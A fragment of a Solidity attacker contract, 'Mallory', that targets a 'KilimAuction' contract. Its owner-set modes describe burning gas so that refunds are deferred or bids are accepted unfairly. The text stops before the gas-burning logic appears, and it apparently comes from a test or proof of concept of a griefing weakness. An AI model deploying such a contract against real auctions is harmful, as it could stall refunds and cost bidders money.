contract Mallory {
    KilimAuction immutable auction;
    address immutable owner = msg.sender;
    uint256 public mode = 1; // 1 cheap, 2 burn everything (refund defers), 3 burn then accept

    constructor(KilimAuction a) { auction = a; }
    function arm(uint256 m) external { require(msg.sender == owner); mode = m; }
    function bid(uint256 amount) external payable { auction.bid{value: amount}(amount, 0, 0); }
